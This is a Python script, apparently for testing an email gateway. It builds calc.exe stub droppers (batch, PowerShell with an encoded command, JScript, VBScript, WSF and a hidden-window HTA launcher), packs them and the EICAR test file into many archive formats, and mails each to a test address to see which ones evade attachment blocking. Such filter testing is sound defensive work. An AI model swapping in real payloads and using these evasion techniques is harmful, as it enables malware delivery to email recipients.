#!/usr/bin/python

#runs on OSX, needs tar, keka

import zipfile, os, datetime, shutil
import subprocess
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders



gmail_user = "XXXXX"
gmail_pwd = "XXXXX"

sendgrid_user = "XXXXX"
sendgrid_pwd = "XXXXX"

yandex_user = "XXXXX"
yandex_pwd = "XXXXX"

cwd = os.getcwd()
now = datetime.datetime.now()
date = now.isoformat()

def make_zip(filename, file):
  newZip = zipfile.ZipFile(filename, 'w')
  newZip.write(file, compress_type=zipfile.ZIP_DEFLATED)
  newZip.close()
  
def make_encrypted_zip(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-tzip", "-pPassword1", "a", filename, file])
    
def make_bat(filename):
  target = open(filename, 'w')
  line = "echo calc a coming... \n"
  line += "START calc.exe"
  target.write(line)
  target.write("\n")
  target.close()
  
def make_cmd(filename):
  target = open(filename, 'w')
  line = "echo calc a coming... \n"
  line += "START calc.exe"
  target.write(line)
  target.write("\n")
  target.close()
  
def make_ps1(filename):
  target = open(filename, 'w')
  line = "# prep your commands first and then invoke them via powershell \n"
  line += "$command = 'cmd.exe /c calc.exe' \n"
  line += "$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) \n"
  line += "$encodedCommand = [Convert]::ToBase64String($bytes) \n"
  line += "# once you have b64 string payload, execute it \n"
  line += "powershell.exe -encodedCommand $encodedCommand \n"
  target.write(line)
  target.close()

def make_js(filename):
  target = open(filename, 'w')
  line = "var objShell = WScript.CreateObject(\"Wscript.Shell\");\n"
  line += "objShell.run(\"%comspec% /c calc.exe\");"
  target.write(line)
  target.write("\n")
  target.close()

#used screnc to make this fiel from the js above
def make_jse (filename):
    return
  
def make_scr (filename):
    return

def make_com (filename):
    return
    
def make_ocx (filename):
    return
    
def make_jar (filename):
    return
    
def make_vbs(filename):
  target = open(filename, 'w')
  line = "Set objShell = Wscript.CreateObject(\"Wscript.Shell\") \n"
  line += "objShell.run(\"%comspec% /c calc.exe\")"
  target.write(line)
  target.write("\n")
  target.close()
    
#used screnc to create this file from the above
def make_vbe (filename):
    return
    
def make_wsf(filename):
  target = open(filename, 'w')
  line = "<job id=\"Job1\"> \n"
  line += "<script language=\"VBScript\"> \n"
  line += "    Set objShell = Wscript.CreateObject(\"Wscript.Shell\") \n"
  line += "    objShell.run(\"%comspec% /c calc.exe\") \n"
  line += "</script>"
  line += "</job>"
  target.write(line)
  target.write("\n")
  target.close()

def make_shs (filename):
    return
    
def make_pif (filename):
    return
    
def make_hta(command):
  #from unicorn.py
  # HTA code here
    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % command
    main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""

    # make a directory if its not there
    if not os.path.isdir("hta_attack"):
        os.makedirs("hta_attack")

    # write out index file
    print("[*] Writing out index file to hta_attack/index.html")
    write_file("hta_attack/index.html", main2)

    # write out Launcher.hta
    print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
    write_file("hta_attack/Launcher.hta", main1)

# see python_lnk_maker -- needs to be run from windows. currently we copy
# a calc.lnk from the main folder to the working folder
def make_lnk (filename):
    return
    
def make_dmg(file, filename):
  subprocess.call(['hdiutil', "create", "-format", "UDZO", "-srcfolder", file, filename])


def make_7zip(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-t7z", "a", filename, file])

def make_tar(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-ttar", "a", filename, file])

def make_targz(filename, file):
  subprocess.call(['tar', "-zcvf", filename, file])

def make_tarbz2(filename, file):
  subprocess.call(['tar', "-jcvf", filename, file])
  
def make_gzip(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-tgzip", "a", filename, file])

def make_bzip2(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-tbzip2", "a", filename, file])

def make_xz(filename, file):
  subprocess.call(['/Applications/Keka.app/Contents/Resources/keka7z', "-ttar", "a", filename, file])


#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.gz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tgz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.bz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tbz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.bz2 eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.xz eicar.com




def write_file(path, text):
    file_write = file(path, "w")
    file_write.write(text)
    file_write.close()
    
#make sure you have enabled imap :-)
def send_gmail(to, subject, text, attach):
  try:
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = to
    msg['Subject'] = subject

    msg.attach(MIMEText(text))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)

    mailServer = smtplib.SMTP("smtp.gmail.com", 587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(gmail_user, gmail_pwd)
    mailServer.sendmail(gmail_user, to, msg.as_string())
    # Should be mailServer.quit(), but that crashes...
    mailServer.close()
  except smtplib.SMTPDataError as e:
      print e

def send_sendgrid(to, subject, text, attach):
  try:
    msg = MIMEMultipart()
    msg['From'] = sendgrid_user
    msg['To'] = to
    msg['Subject'] = subject
    
    msg.attach(MIMEText(text))
    
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
                    
    mailServer = smtplib.SMTP("smtp.sendgrid.net", 587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(sendgrid_user, sendgrid_pwd)
    mailServer.sendmail(sendgrid_user, to, msg.as_string())
                    # Should be mailServer.quit(), but that crashes...
    mailServer.close()
  except smtplib.SMTPDataError as e:
      print e

def send_yandex(to, subject, text, attach):
  try:
    msg = MIMEMultipart()
    msg['From'] = yandex_user
    msg['To'] = to
    msg['Subject'] = subject
    
    msg.attach(MIMEText(text))
    
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
                    
    mailServer = smtplib.SMTP('smtp.yandex.com', 587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(yandex_user, yandex_pwd)
    mailServer.sendmail(yandex_user, to, msg.as_string())
                    # Should be mailServer.quit(), but that crashes...
    mailServer.close()
  except smtplib.SMTPDataError as e:
      print e
      
      

def list_files(path):
    # returns a list of names (with extension, without full path) of all files 
    # in folder path
    files = []
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            files.append(name)
    #print files
    return files 

directory = cwd+"/"+date

#make a directory with time now and change directory to it so our other functions
#make our output files there

if not os.path.exists(directory):
    os.makedirs(directory)

os.chdir(directory)

srcfile1 = cwd+"/"+"eicar.com"
srcfile2 = cwd+"/"+"calc_hta.hta"
srcfile3 = cwd+"/"+"calc_enc.jse"
srcfile4 = cwd+"/"+"calc_enc.vbe"
srcfile5 = cwd+"/"+"calc.lnk"
srcfile6 = cwd+"/"+"asciiart.command"
srcfile7 = cwd+"/"+"SimpleJavaCalculator.jar"
srcfile8 = cwd+"/"+"calc.exe"
srcfile9 = cwd+"/"+"calc_applescript.zip"
dstroot = directory

#copy eicar.com to working dir so we can zip it, dmg it, tar it, etc
shutil.copy(srcfile1, dstroot)
#copy calc_hta.hta to working dir 
shutil.copy(srcfile2, dstroot)
#copy calc_enc.jse to working dir 
shutil.copy(srcfile3, dstroot)
#copy calc_enc.vbe to working dir 
shutil.copy(srcfile4, dstroot)
#copy calc.lnk to working dir 
shutil.copy(srcfile5, dstroot)
#copy asciiart.command to working dir double click run command on  OSX
shutil.copy(srcfile6, dstroot)
#copy simple javacalc.jar to working dir 
shutil.copy(srcfile7, dstroot)
#copy simple calc.exe to working dir 
shutil.copy(srcfile8, dstroot)
#copy simple calc_applescript.app to working dir 
shutil.copy(srcfile9, dstroot)

    
#make our files in the new directory with current date time
#make archives with eicar string
make_zip('eicar.zip','eicar.com')
make_encrypted_zip('eicar_encrypt.zip', 'eicar.com')
make_dmg('eicar.com', 'eicardmg.dmg')
make_7zip('eicar.7z', 'eicar.com')
make_tar('eicar.tar', 'eicar.com')
make_targz('eicar.tar.gz', 'eicar.com')
make_tarbz2('eicar.tar.bz2', 'eicar.com')
make_gzip('eicar.gzip', 'eicar.com')
make_bzip2('eicar.bzip', 'eicar.com')
make_xz('eicar.xz', 'eicar.com')

make_js('calc.js')
make_bat('calc.bat')
make_cmd('calc.cmd')
make_ps1('calc.ps1')
make_js('calc.js')
make_vbs('calc.vbs')
make_wsf('calc.wsf')

#make archives with the js file which gmail allows
make_zip('calcjs.zip','calc.js')
make_encrypted_zip('calcjs_encrypt.zip', 'calc.js')
make_7zip('calcjs.7z', 'calc.js')
make_tar('calcjs.tar', 'calc.js')
make_targz('calcjs.tar.gz', 'calc.js')
make_tarbz2('calcjs.tar.bz2', 'calc.js')
make_gzip('calcjs.gzip', 'calc.js')
make_bzip2('calcjs.bzip', 'calc.js')
make_xz('calcjs.xz', 'calc.js')

#try zipping all the blocked stuff
make_zip('calc_hta.zip','calc_hta.hta')
make_zip('calc_lnk.zip','calc.lnk')
make_zip('calc_enc_jse.zip','calc_enc.jse')
make_zip('calc_enc_vbe.zip','calc_enc.vbe')
make_zip('calc_bat.zip','calc.bat')
make_zip('calc_cmd.zip','calc.cmd')
make_zip('calc_vbs.zip','calc.vbs')
make_zip('calc_wsf.zip','calc.wsf')

#try bzipping the blocked stuff (seems to make it 20 june 2016)
make_bzip2('calc_hta.bzip', 'calc_hta.hta')
make_bzip2('calc_lnk.bzip','calc.lnk')
make_bzip2('calc_enc_jse.bzip','calc_enc.jse')
make_bzip2('calc_enc_vbe.bzip','calc_enc.vbe')
make_bzip2('calc_bat.bzip','calc.bat')
make_bzip2('calc_cmd.bzip','calc.cmd')
make_bzip2('calc_vbs.bzip','calc.vbs')
make_bzip2('calc_wsf.bzip','calc.wsf')

#Try formats that get delivered with something that should be blocked by gmail on the remote end
make_encrypted_zip('calcvbs_encrypt.zip', 'calc.vbs')
make_7zip('calcvbs.7z', 'calc.vbs')
make_tar('calcvbs.tar', 'calc.vbs')
make_targz('calcvbs.tar.gz', 'calc.vbs')
make_tarbz2('calcvbs.tar.bz2', 'calc.vbs')
make_gzip('calcvbs.gzip', 'calc.vbs')
make_xz('calcvbs.xz', 'calc.vbs')

#mail the shit
attachments = list_files(directory)
for file in attachments:
    print "sending:" + file
    #send_sendgrid("unlucky@company.xyz", file, file, file)
    send_gmail("unlucky@company.xyz", file, file, file)
    


#subprocess.call(['7z', 'a', filename+'.7z', filename])
#/Applications/Keka.app/Contents/Resources/keka7z
#/Applications/Keka.app/Contents/Resources/keka7z -t7z a eicar2.7z eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.gz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tgz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.bz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tbz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.tar.bz2 eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -ttar a eicar.xz eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -tgzip a eicar.gzip eicar.com
#/Applications/Keka.app/Contents/Resources/keka7z -tbzip2 a eicar.bzip eicar.com
#tar -zcvf eicar.tar.gz eicar.com
#tar -jcvf archive_name.tar.bz2 eicar.com
#hdiutil create -format UDZO -srcfolder eicar.com archive_name.dmg


